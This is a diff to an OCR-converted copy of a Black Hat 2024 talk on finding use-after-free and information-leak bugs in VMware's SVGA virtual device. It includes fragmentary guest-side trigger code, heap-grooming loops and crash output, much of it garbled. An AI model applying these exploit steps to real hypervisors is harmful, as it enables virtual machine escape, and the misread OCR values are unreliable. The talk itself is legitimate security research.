@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Zisis Sialveras_Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor.pdf"
 pages: 45
 sha256: "5fc21b947de8712a9e444f91605be72018db8475740577cc10f19599aae340e5"
-text_chars: 18570
-ocr_pages: 19
+text_chars: 16815
+ocr_pages: 17
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 88.1
+ocr_unreliable_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:41:29Z"
+converted_at: "2026-08-12T04:45:42Z"
 ---
 # Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor
 
 **Speakers:** Zisis Sialveras  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Zisis Sialveras_Bugs of Yore A Bug Hunting Journey on VMware's Hypervisor.pdf` (45 pages)
+
 
 ## Slide 1
 
@@ -29,12 +35,10 @@ Bugs of yore: A bug hunting journey on VMware’s hypervisor
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ON Ne
-pisek hat
-USA 2024
 AUGUST 7-8, 2024
 BRIEFINGS
 Bugs of yore: A bug hunting
@@ -101,11 +105,10 @@ Zisis Sialveras, zisis@census-labs.com, @_zisis
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Driver
 int handler
 Virtual Machine
@@ -116,7 +119,6 @@ VMM
 (i)
 Host OS Context
 VMM Context
-=
 User-level
 System-level
 ```
@@ -189,12 +191,10 @@ System-level
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 2024
 SVGA PROTOCOL EXAMPLE
 typedef struct SVGA3dCmdDefineGBSurface {
 uint32 sid;
@@ -209,9 +209,6 @@ SVGA3dSize size;
 } SVGA3dCmdBindGBSur face;
 typedef struct SVGA3dCmdDefineGBMob {
 Ss See; typedef struct SVGA3dCmdReadbackGBSurface {
-SVGAMobFormat ptDepth; : —s
-PPN32 base; aoe Ee;
-: } SVGA3dCmdReadbackGBSur face;
 uint32 sizeInBytes;
 } SVGA3dCmdDefineGBMob ;
 ```
@@ -222,12 +219,10 @@ THE FIRST BUG
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ao
-blackhat —_ P
-USA 2024
 THE FIRST BUG
 #BHUSA @BlackHatEvents
 ```
@@ -238,13 +233,10 @@ THE FIRST BUG
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 2024
-u
 nt
 main(void)
 {
@@ -255,14 +247,12 @@ vertexSid =
 indexSid =
 textureSid =
 while (1) {
-‘ts;
 (CID, 1024, 768)
 (vertexData, sizeof vertexDa
 (indexData, sizeof indexData)
 (256, 256, SVGA3D_A8R8G8B8) ;
 (CID, &ts, 1);
 ts[Q@].stage = 0;
-ts[@].name
 ts[@].value
 decls[@].
 decls[@].
@@ -270,13 +260,8 @@ decls[@].
 decls[@].
 decls[@].
 ranges[@]
-ranges[@]
-ranges[@]
-ranges[@]
-ranges[@]
 SVGA3D_TS_BIND_TEXTURE ;
 textureSid;
-QO;
 (CID, &decls, 1, &ranges, 1);
 identity.type = SVGA3D_DECLTYPE_FLOAT3;
 identity.usage = SVGA3D_DECLUSAGE_POSITION;
@@ -300,19 +285,8 @@ vertexSid =
 indexSid =
 while (1) {
 textureSid =
-ts[0].sta
-ts[0].nam
 ts[0].val
 decls[@].
-decls[@].
-decls[@].
-decls[@].
-decls[@].
-ranges[@]
-ranges[@]
-ranges[@]
-ranges[@]
-ranges[@]
 ate *ts;
 (CID, 1024, 768);
 (vertexData, sizeof vertexDa
@@ -333,7 +307,6 @@ array.offset = (MyVertex, position) ;
 .indexArray.surfaceId = indexSid;
 .indexArray.stride = sizeof(uint16) ;
 -indexWidth = sizeof(uint16) ;
-QO;
 ```
 
 ## Slide 12
@@ -342,41 +315,29 @@ QO;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 2024
 0:013> g
-(978.1£24):
 vmware vmx+0x23bcdc:
-OO0O007£f6 61f8bcdc 488b5208
 0:013> DQ RDX
 00000000
-00000000°
 00000000
 00000000
 00000000
 258b0fe0
 258b0ff0
-~258b1000
 00000000°
 258b1010
-~258b1020
 00000000°
 258b1030
-~258b1040
 00000000°
 258b1050
-9222222?
 SMELLS LIKE UAF
 mov
-222222722?
 Access violation - code c0000005
-(tt!
 rdx,qword ptr
-922227227?
-2222227272?
 second chance
 [rdx+8 ]
 ```
@@ -387,10 +348,10 @@ second chance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
 USA 2024 2.
 ANALYSIS OF THE DEALLOCATION
 void *CacheView_Get(struct cache *cache_obj, int cdev_type, /* a dozen of arguments */ ) {
@@ -414,11 +375,10 @@ return found->ptr;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 new_slot =
 switch(cdev_type) {
 case @:
@@ -441,11 +401,10 @@ return new_slot->ptr;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 if (ContextPtr->State & 8) {
 while (1) {
 Destination = UAFStructPtrGlobalContainer + x280; textureSid = (256, 256, SVGA3D_A8R8G8B8) ;
@@ -461,7 +420,6 @@ Destination = UAFStructPtrGlobalContainer + @x2c@;
 if (*( *)(ContextPtr + ox1a8) != oxffffFfft) { ; (CID, &decls, 1, &ranges, 1);
 *Destination = (cacheobj, 2, ...); decls[@].identity.type = SVGA3D_DECLTYPE_FLOAT3;
 } else { decls[@].identity.usage = SVGA3D_DECLUSAGE_POSITION;
-, “Destination = 3 decls[@].array.surfaceId = vertexSid;
 }
 if (ContextPtr->State & @x2e) {
 Destination = UAFStructPtrGlobalContainer + SomeIndex *
@@ -473,15 +431,12 @@ if (TextureState.value != exffffffFF) {
 }
 8 + Qx3be;
 (cacheobj, 9, Context->TextureState.value, ..
--)5
 decls[@].array.stride = sizeof(MyVertex) ;
 decls[9@].array.offset = (MyVertex, position) ;
 ranges[@].primType = SVGA3D_PRIMITIVE_TRIANGLELIST;
 ranges[@].primitiveCount = numTriangles;
 ranges[@].indexArray.surfaceId = indexSid;
-ranges[9].indexArray.stride = sizeof(uint16) ;
 ranges[@].indexWidth = sizeof(uint16) ;
-Q);
 ```
 
 ## Slide 16
@@ -522,16 +477,6 @@ CacheView_Get
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-PN
-blackhat —_
-USA 2024
-BUILDING THE EXPLOIT
-#BHUSA
-```
-
 ## Slide 18
 
 # DEVELOPING A REAL-WORLD EXPLOIT
@@ -566,21 +511,16 @@ BUILDING THE EXPLOIT
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 MEETING THE REQUIRMENTS
 1. Context typedef struct { :
 SVGA3dRect viewport;
-1 dRect scissorRect ;
-2. Vertex Declaration 1 — =
 3. Render Ta rgets SVGA3dSurfaceImageId renderTargets|SVGA3D_RT_MAX];
 SVGAGBVertexElement decli[4|;
 4. Texture state
-SVGAGBVertexStream streams | SVGA3D_MAX_VERTEX_ARRAYS ] ;
-SVGA3dVertexDivisor divisors [{SVGA3D_MAX_VERTEX_ARRAYS ] ;
 uint32 numVertexDecls;
 uint32 numVertexStreams ;
 typedef struct SVGA3dCmdDefineGBContext { uint32 numVertexDivisors ;
@@ -591,7 +531,6 @@ uint32 textureStages|[SVGA3D_NUM_TEXTURE_UNITS ][SVGA3D_TS_CONSTANT + 1];
 typedef struct SVGA3dCmdBindGBContext { uint32 €sColorKeyEnable|SVGA3D_NUM_TEXTURE_UNITS ] ;
 uint32 cid;
 SVGAMobId mobid; SVGA3dShaderConstFloat pShaderFValues|SVGA3D_CONSTREG_MAX] ;
-uint32 validContents; SVGA3dShaderConstFloat vShaderFValues | SVGA3D_CONSTREG_MAX |] ;
 } SVGA3dCmdBindGBContext ; } SVGAGBContextData;
 ```
 
@@ -601,31 +540,27 @@ uint32 validContents; SVGA3dShaderConstFloat vShaderFValues | SVGA3D_CONSTREG_MA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-g fis
 black hat
 USA 2024 ee
 TRIGGER THE BUG FROM WINDOWS
 #define VULN_CONTEXT_ID @x60
-SurfaceIdBase = 0x1@0;
 /*
 * InitAndDraw initializes all the required objects and fields
 * to force the SVGA3D_CMD DRAW to execute CacheView_Get()
 */
 (VULN_CONTEXT_ID, VULN_CONTEXT_ID, SurfaceIdBase,
-SurfaceIdBase, 0x20, );
 SurfaceIdBase += 9x20;
 // The number of loop iterations is calculated in that way to fill
 // the cache and free the least recently used buffers.
 for (Counter = 1; Counter < @x67; Counter++) {
 (VULN_CONTEXT_ID + Counter, VULN_CONTEXT_ID + Counter,
-SurfacelIdBase, SurfaceIdBase, 9x20, );
 SurfaceIdBase += 9x20;
 }
 (VULN_CONTEXT_ID, VULN_CONTEXT_ID, SurfaceIdBase,
-SurfacelIdBase, 90x20, );
 ```
 
 ## Slide 21
@@ -634,15 +569,14 @@ SurfacelIdBase, 90x20, );
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
 USA 2024 2.
 INTERESTING USE
 if (UAFStructPtrContainer->DepthStencilViewObject && UAFStructPtrContainer->RenderTargetViewObjects[@]) {
 UAFStructPtrContainer - >DepthStencilViewObject,
-UAFStructPtrContainer - >RenderTargetViewObjects[@]);
 ```
 
 ## Slide 22
@@ -693,12 +627,10 @@ MORE BUGS
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-| wr
-pifek hat — 2 4
-USA 2024
 MORE BUGS
 #BHUSA @BlackHatEvents
 ```
@@ -733,10 +665,10 @@ MORE BUGS
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
 USA 2024 2.
 RCO INIT
 ResourceContainer *rc, SVGA_Surface *surface, /*...*/) {
@@ -761,10 +693,10 @@ return 1;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat a
 INFORMATION LEAK
 // Both source and destination surfaces will allocate a ResourceContainer of type 9 at the next Draw call.
 SVGA3D_DefineGBSurface( sid: SourceSurfaceId, (SVGA3dSurfaceFlags)0x20008000, format: SVGA3D_BC3_UNORM,
@@ -866,17 +798,10 @@ SVGA3D_ReadbackGBSurface( sid: DestinationSurfaceld) ;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 37/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat —
-USA 2024
-healer dire
-i fie die,
-fied feagen fic echo att Susie, easlanaes ela
-Coreen ga Gixasctchettertaree fa Magen Hatenfie groffe Crs fiatline Britlen,
-Hafmenien langen S ake voll rrobeeectientes Speoceci, ist ez: Silo ale mit hard (hy
-¥ aml verfecbenift, anefange Licthic tind darmit detiten fc rméman thin, nd gebraiice
 EVEN MORE BUGS
 #BHUSA @BlackHatEvents
 ```
@@ -917,7 +842,8 @@ EVEN MORE BUGS
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 g >
@@ -935,7 +861,6 @@ if (! (obj, &InstrBuffer, &Opcode) )
 goto fail;
 }
 SM3_@x51Handler(ShaderObject *obj, *InstrBuffer) { : .
-veut if (obj->VulnBuffer == ){
 p = obj->VulnBuffer = (@x100@09, 0x140e);
 }
 if (val < @x10ee) {
@@ -945,11 +870,9 @@ p[Position].b = InstrBuffer;
 p[Position].c = val;
 val = *( *)InstrBuffer ;
 if (val >= 0x10@)
-return E
 if (*( *)obj->Offsetex4Es) {
 (obj + Oxidef@, val, ++InstrBuffer) ;
 } else {
-VF? soo i
 obj->VulnBufferOffset++; // (1)
 }
 ```
@@ -1063,13 +986,3 @@ obj->VulnBufferOffset++; // (1)
 THANK YOU!
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-‘ “Vary \ em,
-<
-blackhat' = ~—-
-USA 2024
-#BHUSA @BlackHatEvents
-```
